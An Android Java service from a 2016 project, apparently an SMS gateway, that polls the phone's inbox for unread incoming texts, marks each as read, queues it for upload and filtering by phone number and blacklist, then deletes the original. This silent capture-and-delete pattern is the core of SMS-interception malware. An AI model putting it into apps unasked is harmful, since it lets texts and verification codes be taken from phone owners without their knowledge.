package service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;
import java.text.SimpleDateFormat;
import java.util.Date;

import globalData.GlobalData;
import model.SMS;
import model.ShowItem;
import util.MyDBOperation;
import util.TimeAndDateType;
import util.UsuallyMethod;

/**
 * * @author chenyao E-mail: 326907403@qq.com
 * 
 * @date 创建时间：2016-2-26 下午2:49:39
 * @version 1.0
 * @parameter
 * @since
 * @return
 */
@SuppressLint("HandlerLeak")
public class GetMessageService extends Service {

	// 数据库访问
	private MyDBOperation db;

	private ShowItem showItem;

	// 用于开启和关闭线程的变量
	private boolean isClose = false;

	@Override
	public IBinder onBind(Intent arg0) {

		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();

		init();

		new Thread(getMessageFromLocal).start();

	}

	private void init() {

		db = new MyDBOperation(getApplicationContext());

	}

	Runnable getMessageFromLocal = new Runnable() {

		@SuppressLint("SimpleDateFormat")
		@Override
		public void run() {

			try {

				while (!isClose) {

					// 设置每个线程的间隔处理时间
					Thread.sleep(GlobalData.getMessageSleepTime);

					// 从本地短信库提取一条短信
					showItem = getOneMessageFromLocal();

					if (showItem != null) {
						// 如果提取出一个数据，则上传到服务器端
						setInfo(showItem);

					} else {
						// 控制台显示没有需要上传的信息
						showWhenEmpty();
					}

				}
			} catch (InterruptedException e) {

				e.printStackTrace();
			}
		}
	};

	@SuppressLint("SimpleDateFormat")
	protected void showWhenEmpty() {
		SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

		Log.i(GlobalData.LOG, "------------Local Message is null--------------" + simpleDateFormat.format(new Date()));
	}

	private ShowItem getOneMessageFromLocal() {

		// 需要从短信库中提取的内容
		String[] PROJECTION = new String[] { SMS._ID, // 0
				SMS.ADDRESS, // 2
				SMS.BODY, // 3
				SMS.DATE,// 4
		};

		// 选择条件
		String SELECTION =
				// 短信类型，1代表接收，2代表发送
				// 协议，分为： 0 SMS_RPOTO, 1 MMS_PROTO
				// 是否阅读 0未读， 1已读
				SMS.TYPE + " = 1" +

						" and " + SMS.READ + " = 0" + " and protocol =0";//

		ContentResolver mResolver = getContentResolver();

		Cursor cursor = mResolver.query(SMS.CONTENT_URI, PROJECTION,

				SELECTION, null, "_id desc");

		ShowItem item = null;

		if (cursor.moveToNext())

		{

			item = new ShowItem();

			item.setId(cursor.getInt(cursor.getColumnIndex("_id")));

			item.setContent(cursor.getString(cursor.getColumnIndex("body")));

			item.setPhone(cursor.getString(cursor.getColumnIndex("address")));

			item.setTime(TimeAndDateType.GetStringFromLong(cursor.getLong(cursor.getColumnIndex("date"))));

			item.setUuid(UsuallyMethod.getUUID());

			Log.i(GlobalData.LOG, "获得短信库一条未处理短信" + item.getId());

			// 将短信设置为已读
			ContentValues cv = new ContentValues();

			cv.put("read", "1");

			String selecion_update = " _id = " + cursor.getInt(cursor.getColumnIndex("_id"));

			Log.i(GlobalData.LOG, "更新短信库短信为已读" + item.getId());

			mResolver.update(Uri.parse("content://sms/inbox"), cv, selecion_update, null);

			cv.clear();

		}

		cursor.close();

		return item;
	}

	// 删除本地短信
	private void deleteMessage(int id) {

		try {

			ContentResolver CR = getContentResolver();

			String selecion_update = " _id = " + id;

			CR.delete(Uri.parse("content://sms"), selecion_update, null);

			Log.i(GlobalData.LOG, "成功删除id = " + id + "的短信信息");

		} catch (Exception e) {

		}
	}

	private void setInfo(ShowItem item) {

		try {

			db.insertBuffPush(item);

			Log.i(GlobalData.LOG, "正在处理id = " + item.getId() + "的短信信息" + item.getPhone());

			// 判断规则，必须是手机号码并且不在黑名单中
			if ((isPhoneNumber(item.getPhone())) && (!(db.findPhoneFromBlack(item.getPhone())))) {

				db.insertBuffSend(item);

			}

			// 添加到队列成功之后就删除本地短信
		} catch (Exception e) {

			e.printStackTrace();

		}
		deleteMessage(item.getId());
	}

	private boolean isPhoneNumber(String phone) {

		if ((phone.length() < 11) || (phone.length() > 14)) {

			return false;

		}

		String number = phone.substring(phone.length() - 11, phone.length());

		Log.i(GlobalData.LOG, "正在判断手机号" + number + "	 前两位为   = " + number.substring(0, 2));

		if (number.substring(0, 2).equals("13") || number.substring(0, 2).equals("14")
				|| number.substring(0, 2).equals("15") || number.substring(0, 2).equals("16")
				|| number.substring(0, 2).equals("17") || number.substring(0, 2).equals("18")
				|| number.substring(0, 2).equals("19")) {

			Log.i(GlobalData.LOG, "确定为正确号码");

			return true;
		}

		return false;
	}

	@Override
	public void onDestroy() {

		super.onDestroy();

		isClose = true;
	}

}
